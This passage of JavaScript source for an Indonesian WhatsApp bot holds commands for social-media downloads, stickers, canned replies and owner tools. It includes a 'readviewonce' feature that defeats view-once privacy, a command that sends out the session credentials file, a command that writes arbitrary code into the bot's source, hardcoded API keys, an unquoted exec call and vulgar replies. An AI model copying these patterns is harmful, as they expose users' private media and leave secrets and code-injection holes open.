    const respon = await fetchJson(`https://skizo.tech/api/ttstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
    NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
    const data = respon.data.user
    const data1 = respon.data.stats
        let res = await fg.igStalk(args[0])
        let te = `
    ┌──「 *STALKING* 
    ▢ *🔖Name:* ${data.nickname} 
    ▢ *🔖Username:* ${data.uniqueId}
    ▢ *👥Follower:* ${data1.followerCount}
    ▢ *🫂Following:* ${data1.followingCount}
    ▢ *📌Bio:* ${data.signature}
    ▢ *🏝️Posts:* ${data1.videoCount}
    ▢ *❣️Suka:* ${data1.heart}
    ▢ *🔗 Link* : https://tiktok.com/${data.uniqueId}
    └────────────`
         await NanoBotz.sendMessage(m.chat, {image: { url: data.avatarLarger }, caption: te }, {quoted: m})
          } catch {
            replynano(`Pastikan nama pengguna berasal dari *tiktok*`)
          }
    }
    break
//======================================================================  















































//======================================================================
//case download
case 'tiktok':
case 'tt': {
  if (!text) return replynano(`Contoh: ${prefix + command} link`);
      try {
reply(mess.wait)
require('./lib/tiktok').Tiktok(text).then( data => {
const ttcp = `👤 *Author*: ${data.author}\n📑 *Title*: ${data.title}\n\n©${botname}`
NanoBotz.sendMessage(m.chat, { caption: ttcp, video: { url: data.watermark }}, {quoted:m})
})
} catch (error) {
     const data = await fetchJson(`https://itzpire.com/download/tiktok?url=${encodeURIComponent(text)}&type=v2`);

const caption = `┈──────────────────────⫺
            *ㄒ丨ҜㄒㄖҜ         丨几千ㄖ*
┈──────────────────────⫺
*Author*: ${data.data.author.nickname}
*Like*: ${data.data.statistics.likeCount}
*Komentar*: ${data.data.statistics.commentCount}
*Share*: ${data.data.statistics.shareCount}
*Title*: ${data.data.desc}

_Download By ${global.botname}_`;
const vidnya = data.data.video;
NanoBotz.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
}
}
break;
//==============================================
case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replynano(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
	  reply(mess.wait)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replynano(`Terjadi kesalahan: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replynano(`Tidak ada video atau gambar yang ditemukan atau Respons tidak valid dari API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `Ini dia kak🔥 ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      NanoBotz.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      NanoBotz.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break

case 'snackvideo': {
  if (!text) return reply(mess.query.link)
  reply(mess.query.link)
const data = fetchJson(`https://api.lolhuman.xyz/api/snackvideo?apikey=danzxnano&url=${encodeURIComponent(text)}`)
const vidnya = data.result.url;
const cption = data.result.caption|| "nih kak"
NanoBotz.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return replynano( `Example : ${prefix + command} link`)
reply(mess.wait);
const data = await fetchJson(`https://skizo.tech/api/tiktok?apikey=nanogembul&url=${encodeURIComponent(text)}`)
const audionya = data.data.music_info.play
NanoBotz.sendMessage(m.chat, { audio: { url: audionya }, mimetype: 'audio/mp4' }, { quoted: m })
}
break

case 'twitterdl':
case 'twitter': {
  function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Linknya mana, bro..');
try {
  reply(mess.wait);
const response = await fetch(`https://skizo.tech/api/twitter?apikey=nanogembul&url=${encodeURIComponent(text)}`);
const data = await response.json();
for (let ii = 0; ii < data.media.length; ii++) {
  const caption = ii === 0 ? data.authorName : '';
  const url = data.media[ii].url;
  const type = data.media[ii].type.includes('video') ? 'video' : 'image';
  await NanoBotz.sendMessage(m.chat, {
    [type]: {
      url: url,
    },
    caption,
  }, {
    quoted: m,
  });
  await delay(1500);
}
} catch (e) {
  console.error(e);
  reply('Server error!');
  return e.toString();
}
}
break

case 'spdl': case 'spotifydl': {
  if (!text) return reply('Masukan Link spotify nya\ncontoh: .spdl https://xxxx')
  let result = await spotifydl(text)
  let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nBangsul-Bot`
   const p = await new canvafy.Spotify()
              .setTitle(result.title)
              .setAuthor("Spotify - Downloader")
              .setTimestamp(40, 100)
              .setOverlayOpacity(0.8)
              .setBorder("#fff", 0.8)
              .setImage(result.image)
              .setBlur(3)
              .build(); 
  
         await NanoBotz.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
      NanoBotz.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'bangsul' }, { quoted: m });
  }
  

  case 'fb':
           case 'facebook':
           case 'facebookvid': {
           if (!text)  return replynano(`Silakan kirimkan tautan video Facebook\n\nCONTOH :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
     NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  try {
    const data = await fetchJson(`https://itzpire.com/download/facebook?url=${encodeURIComponent(text)}`)
    const tex = `*[ FACEBOOK DL BY ${botname} ]*`;
    const videoBuffer = data.data.video_sd;
    NanoBotz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replynano('Yah error kak')
  }
  }
  break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replynano(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replynano('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
NanoBotz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	replynano(`Verify that the link is from Twitter`)
	}
}
break
//=========================================\\

case 'gdrive': {
		if (!args[0]) return replynano(`Silakan Masukan Link gdrive Anda`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replynano(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	NanoBotz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replynano('Error: Silakan Cek Link google drive Anda 🗿') 
  }
}
break
break
  case 'git': case 'gitclone':
  if (!args[0]) return replynano(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
  if (!isUrl(args[0]) && !args[0].includes('github.com')) return replynano(`Link invalid!!`)
  let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
      let [, user, repo] = args[0].match(regex1) || []
      repo = repo.replace(/.git$/, '')
      let url = `https://api.github.com/repos/${user}/${repo}/zipball`
      let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
      NanoBotz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replynano(mess.error))
  break
  
//======================================================================














































//======================================================================
//case convert
case 'ss':
case 'ssweb':{
if (!text) return replynano(`gunakan perintah ini seperti ini\n  .ss (link)`)
try {
NanoBotz.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nanogembul` }}, { quoted: m})
			} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break

case 'removebg':
case 'nobg':
case 'hapusbackground':{
if (!quoted) return replynano(`mana Fotonya kak?`)
reply(mess.wait)
try {
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh (media)
NanoBotz.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/removebg?apikey=nanogembul&url=${anu}` }, caption: `*Sukses menghapus background*\n${xtime}` }, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break

case 'hd':
  case 'remini':{
if (!quoted) return replynano(`Where is the picture?`)
			if (!/image/.test(mime)) return replynano(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			reply(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			NanoBotz.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
			} catch {
			  reply('yah eror kak')
			}
			}
    
break
case 'toonce': case 'toviewonce': { 
  if (!quoted) return replynano(`Reply Image/Video`)
    reply(mess.wait)
  if (/image/.test(mime)) {
    anuan = await NanoBotz.downloadAndSaveMediaMessage(quoted)
    NanoBotz.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
  } 
  else if (/video/.test(mime)) {
    anuanuan = await NanoBotz.downloadAndSaveMediaMessage(quoted)
    NanoBotz.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
  }
}

break
        case 'fliptext': {
        if (args.length < 1) return replynano(`Example:\n${prefix}fliptext ${ownername}`)
        quere = args.join(" ")
        flipe = quere.split('').reverse().join('')
        replynano(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
        }
        
          break
          case 'tourl': {
            const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
            let anuu = await TelegraPh (media)
            replynano(`📮 *L I N K :*
          ${anuu}
          📊 *S I Z E :* ${media.length} Byte
          📛 *E x p i r e d :* No Expiry Date`)
          await fs.unlinkSync(media)
          }
            break
            break
            case '🐦':
            case 'rvo':
            case 'readviewonce': {
              if (!m.quoted) return replynano(`Balas untuk melihat pesan sekali`)
              if (m.quoted.mtype !== 'viewOnceMessageV2') return replynano(`This is not a view once message`)
                let msg = m.quoted.message
                let type = Object.keys(msg)[0]
                let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
                let buffer = Buffer.from([])
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                if (/video/.test(type)) {
                    return NanoBotz.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
                } else if (/image/.test(type)) {
                    return NanoBotz.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
                }
            }
break
case 'qc': {
  if (!q) return replynano('Enter Text');
  const ppnyauser = await NanoBotz.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
  const json = {
      "type": "quote",
      "format": "png",
      "backgroundColor": "#FFFFFF",
      "width": 512,
      "height": 768,
      "scale": 2,
      "messages": [
          {
              "entities": [],
              "avatar": true,
              "from": {
                  "id": 1,
                  "name": pushname,
                  "photo": {
                      "url": ppnyauser
                  }
              },
              "text": q,
              "replyMessage": {}
          }
      ]
  };

  const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
      headers: {'Content-Type': 'application/json'}
  });
  const buffer = Buffer.from(res.data.result.image, 'base64');
  const rest = { 
      status: "200", 
      creator: "AdrianTzy",
      result: buffer
  };

  NanoBotz.sendImageAsSticker(m.chat, rest.result, m, {
      packname: `${global.packname}`,
      author: `${global.author}`
  });
}
break;
case 's':
case 'stiker':
case 'sticker': 
const getRandom = (ext) => {
          return `${Math.floor(Math.random() * 10000)}${ext}`
      }
  let kualitas = isImage ? 70 : 2;
  const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
let media = await NanoBotz.downloadAndSaveMediaMessage(quoted);
const jancok = new Sticker(media, {
    pack: global.packname, // The pack name
    author: global.author, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['🤩', '🎉'], // The sticker category
    id: '12345', // The sticker id
    quality: kualitas, // The quality of the output file
    background: '#FFFFFF00' // The sticker background color (only for full stickers)
  });
  let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await NanoBotz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
break;
case 'toimg': {
  reply(mess.wait);

  // Fungsi untuk menghasilkan nama file acak
  const getRandom = (ext) => {
      return `${Math.floor(Math.random() * 10000)}${ext}`;
  };

  // Pastikan ada pesan yang dikutip
  if (!m.quoted) return replynano(`_Reply to any sticker._`);

  // Mengecek jenis pesan yang dikutip
  let mime = m.quoted.mimetype || '';

  if (mime === "image/webp") {
      try {
          // Download dan simpan media yang dikutip
          let media = await NanoBotz.downloadAndSaveMediaMessage(m.quoted);
          let outputName = getRandom('.png');

          // Mengonversi stiker WebP menjadi PNG menggunakan ffmpeg
          exec(`ffmpeg -i ${media} ${outputName}`, (err) => {
              if (err) {
                  fs.unlinkSync(media); // Hapus file media sementara
                  return replynano('Terjadi kesalahan saat mengonversi stiker.');
              }

              // Membaca file PNG yang dihasilkan
              let buffer = fs.readFileSync(outputName);

              // Mengirim gambar sebagai pesan
              NanoBotz.sendMessage(m.chat, { image: buffer }, { quoted: m });

              // Hapus file sementara
              fs.unlinkSync(media);
              fs.unlinkSync(outputName);
          });
      } catch (error) {
          replynano(`Terjadi kesalahan: ${error.message}`);
      }
  } else {
      return replynano(`Please reply to a non-animated sticker.`);
  }
}
break;

case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : ` `
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : `.`
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await NanoBotz.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break
  //=========================================\\
  case 'say': case 'tts': case 'gtts':{
    if (!text) return replynano('Where is the text?')
                let texttts = text
                const xeonrl = googleTTS.getAudioUrl(texttts, {
                    lang: "id",
                    slow: false,
                    host: "https://translate.google.com",
                })
                return NanoBotz.sendMessage(m.chat, {
                    audio: {
                        url: xeonrl,
                    },
                    mimetype: 'audio/mp4',
                    ptt: true,
                    fileName: `${text}.mp3`,
                }, {
                    quoted: m,
                })
            }
    
break
case 'emojimix': {
  let [emoji1, emoji2] = text.split`+`
  if (!emoji1) return replynano(`contoh : ${prefix + command} 😅+🤔`)
  if (!emoji2) return replynano(`contoh : ${prefix + command} 😅+🤔`)
  let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
  for (let res of anumojimix.results) {
      let encmedia = await NanoBotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
      
  }
    }
    break
//==================================================================
break
//==================================================================
case 'hdvid' :
  case 'hdvideo' :
    case 'hdvidio' :
case 'vidhd' :{
  try {
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh(media)
const response = await fetch(`https://api.alyachan.dev/api/vid-enhance?video=${anuu}&apikey=manz.alien`)
const hasil = await response.json();
const vidhd = hasil.data.url;
const caption = `sukses membuat video menjadi hd\ndurasi: ${hasil.data.duration}\nsize: ${hasil.data.size}`
NanoBotz.sendMessage(m.chat, { caption: caption, video: { url: vidhd }}, {quoted:m});
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
}
break
break

case 'ytmp3': {
  if (!text) return replynano(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)
NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  let searchResponse = await ytdlnew(text)
  NanoBotz.sendMessage(m.chat, { audio: {url: searchResponse.mp3DownloadLink}, mimetype: "audio/mp4", ptt: false},
               { quoted:m})
}
break
case 'ytmp4': case 'ytvideo': {
if (!text) return replynano(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)
NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let searchResponse = await ytdlnew(text)
const ytc = `*[ YOUTUBE DOWNLOADER ]*

©${botname}`;
NanoBotz.sendMessage(m.chat, { video: { url: searchResponse.mp4DownloadLink }, caption: ytc }, { quoted: m })
}
break

case 'tomp4': 
case 'tovideo':
case 'tovid' : {
    if (!m.quoted) return replynano('reply stiker untuk mengubah menjadi mp4');
    
    // Memastikan mime type dari pesan yang dikutip adalah stiker dengan format WebP
    let mime = m.quoted.mimetype || '';
    if (!/webp/.test(mime)) return replynano(`tolong reply stiker lalu ketik *${prefix + command}*`);

    replynano(mess.wait);

    try {
        // Mengimpor modul webp2mp4File dari file 'uploader'
        let { webp2mp4File } = require('./lib/uploader');
        
        // Mendownload dan menyimpan media dari pesan yang dikutip
        let media = await NanoBotz.downloadAndSaveMediaMessage(m.quoted);

        // Mengonversi file WebP menjadi video MP4
        let webpToMp4 = await webp2mp4File(media);

        // Mengirim video hasil konversi
        await NanoBotz.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp to Video' }, { quoted: m });

        // Menghapus file media sementara
        fs.unlinkSync(media);
    } catch (error) {
        // Penanganan kesalahan
        replynano(`Terjadi kesalahan saat mengonversi stiker: ${error.message}`);
    }
}
break;

 
 case 'toqr':{
if (!q) return replynano(' Please include link or text!')
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await NanoBotz.sendMessage(from, { image: medi, caption:"Ini dia!!"}, { quoted: m })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}

break
        
//=========================================\\









































//==================================================================
//case add
break
case 'ngakak':{
 m.reply("gitu doang udah ngakak\njadi manusia kok selera humornya rendah🗿☕") 
 }
break

break
case '😭':{
 m.reply("kok kamu nangis sih, aku juga nangis deh 😭😭") 
 }
break

break
case 'ngentot':{
 m.reply("gas...aku yang nge videoin 🎥") 
 }
break

break
case 'goblok':{
 m.reply("yang goblok mah elu, gua kagak 🥱") 
 }
break

break
case '😭😭':{
 m.reply("kok kamu nangis sih, aku juga nangis deh 😭😭😭") 
 }
break

break
case 'diam':{
 m.reply("iya iya aku diam...😌🙏🥺") 
 }
break

case 'p': {
  const msgai = 'gak punya agama ya'
NanoBotz.sendMessage(m.chat, {
      audio: { url: `https://nue-api.vercel.app/api/tts?lang=id&text=${msgai}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
}
break



   
































//=========================================\\
//case owner

case 'addcase': {
    if (!DanzTheCreator) return reply(mess.only.owner) 
    if (!text) return replynano('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'Nano.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replynano('Terjadi kesalahan saat menulis file:', err);
            } else {
                replynano('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replynano('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;

case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replynano('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan mantan<3\n\n`
if(filteredArray.length == 0) return replynano(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replynano(`${teks}`) 
await sleep(2000)
replynano("Menghapus file Kenangan mantan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replynano("Berhasil menghapus semua Kenangan di folder session")     
});
}
break
case 'setbotname':{
  if (!DanzTheCreator) return reply(mess.only.owner)
  if (!text) return replynano(`Where is the name?\nExample: ${prefix + command} Cheems Bot`)
      await NanoBotz.updateProfileName(text)
      replynano(`Success in changing the name of bot's number`)
      }
      break
  case 'setbotbio':{
  if (!DanzTheCreator) return reply(mess.only.owner)
  if (!text) return replynano(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
      await NanoBotz.updateProfileStatus(text)
      replynano(`Success in changing the bio of bot's number`)
      }
      break

  case 'deleteppbot': case 'delppbot': {
if (!DanzTheCreator) return reply(mess.only.owner)
    await NanoBotz.removeProfilePicture(NanoBotz.user.id)
    replynano(`Success in deleting bot's profile picture`)
    }
    break
    case 'deleteppbot': case 'delppbot': {
      if (!DanzTheCreator) return reply(mess.only.owner)
          await NanoBotz.removeProfilePicture(NanoBotz.user.id)
          replynano(`Success in deleting bot's profile picture`)
          }
          break
  
          case 'paptt': {
            if (!isPrem) return replyprem(mess.premium)
           global.paptt = [
            "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
            "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
            "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
            "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
            "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
            "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
            "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
            "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
            "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
            "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
            "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
            "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
            "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
            ]
             let url = paptt[Math.floor(Math.random() * paptt.length)]
             NanoBotz.sendFile(m.chat, url, null, 'Tch, dasar sangean', m)
           }
           break
            
                       case 'listpc': {
            let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
            let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
            for (let i of anulistp) {
            let nama = store.messages[i].array[0].pushName
            teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
            }
            NanoBotz.sendTextWithMentions(m.chat, teks, m)
                        }
                        break
           case 'listgc': {
            let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
            let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
            for (let i of anulistg) {
            let metadata = await NanoBotz.groupMetadata(i)
            teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
            }
            NanoBotz.sendTextWithMentions(m.chat, teks, m)
                        }
                        break
                        
                   case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
           if(!DanzTheCreator) return reply(mess.only.owner)
                   if (!q) return replynano(`Masukkan teks`)
                   let getGroups = await NanoBotz.groupFetchAllParticipating()
                   let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                   let xeoncast = groups.map(v => v.id)
                   replynano(` Menyiarkan dalam ${xeoncast.length} Obrolan Grup, dalam ${xeoncast.length * 1,5} detik`)
                   for (let i of xeoncast) {
           let txt = `${ownername}'s Siaran\n\nPesan : ${q}`
           if(/image/.test(mime)) {
           let media = await quoted.download()
           await NanoBotz.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
           }
           if(/video/.test(mime)){
           let media = await quoted.download()
           await NanoBotz.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
           }
                       }
                   replynano(`Berhasil Disiarkan di Grup ${xeoncast.length}`)      
                   break
           case 'block': case 'ban': {
               if (!DanzTheCreator) return reply(mess.only.owner)
               let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
               await NanoBotz.updateBlockStatus(users, 'block')
               await replynano(`Done`)
             }
             break
                   case 'unblock': case 'unban': {
               if (!DanzTheCreator) return reply(mess.only.owner)
               let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
               await NanoBotz.updateBlockStatus(users, 'unblock')
               await replynano(`Done`)
             }
             break
           case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
             const lisben = "Total Block: " + banUser.length
             replynano(lisben)
             }

             break 
             //=========================================\\======
             case 'report': {
             replynano(` =====[ *DEVELOPER OF BANGSUL BOT* ]===== 
             • ᴊᴀɴɢᴀɴ ᴄʜᴀᴛ ꜱᴇᴍʙᴀʀᴀɴɢᴀɴ ᴋᴇ ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ ᴍᴀᴋᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ ᴅɪ ʙʟᴏᴋɪʀ
             • ᴊᴀɴɢᴀɴ ᴄᴀʟʟ/ᴛᴇʟᴇᴘᴏɴ ᴏᴡɴᴇʀ ᴛᴀɴᴘᴀ ɪᴢɪɴ • ᴄʜᴀᴛ ʟᴀɴɢꜱᴜɴɢ ᴋᴇ ɪɴᴛɪɴʏᴀ ᴀᴊᴀ , 
             • https://wa.me/6282268881337?text=Lapor+min+fitur+ada+yang+eror+kalo+bisa+di+perbaiki.
             ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
             }
            
             break
             case 'getsession':
             if (!DanzTheCreator) return reply(mess.only.owner)
             replynano('Wait a moment, currently retrieving your session file')
             let sesi = await fs.readFileSync('./session/creds.json')
             NanoBotz.sendMessage(m.chat, {
             document: sesi,
             mimetype: 'application/json',
             fileName: 'creds.json'
             }, {
             quoted: m
             }) 
             
             break
             case 'request': case 'reportbug': {
               reply(mess.wait)
               if (!text) return replynano(`Example : ${
                     prefix + command
                   } hi dev play command is not working`)
                         textt = `*| REQUEST/BUG |*`
                         teks1 = `\n\n*User* : @${
                m.sender.split("@")[0]
               }\n*Request/Bug* : ${text}`
                         teks2 = `\n\n*Hai ${pushname}, Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
                         for (let i of owner) {
             NanoBotz.sendMessage(i + "@s.whatsapp.net", {
             text: textt + teks1,
             mentions: [m.sender],
             }, {
             quoted: m,
             })
                         }
                         NanoBotz.sendMessage(m.chat, {
             text: textt + teks2 + teks1,
             mentions: [m.sender],
                         }, {
             quoted: m,
                         })
             
                     }
                     break
  case 'getcase':
  if (!DanzTheCreator) return reply(mess.only.owner)

  const getCase = (cases) => {
    try {
      let fileContent = fs.readFileSync("Nano.js").toString();
      
      // Cek apakah case ada di dalam file
      if (!fileContent.includes('case \'' + cases + '\'')) {
        return "Case tidak ditemukan!";
      }

      // Ambil bagian dari case yang dicari
      let caseContent = fileContent.split('case \'' + cases + '\'')[1].split("break")[0];
      return "case" + `'${cases}'` + caseContent + "break";
      
    } catch (error) {
      return "Terjadi kesalahan: " + error.message;
    }
  }

  replynano(`${getCase(q)}`)
  break;

//=========================================\\
	case 'addprem': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} 6285892928715`)
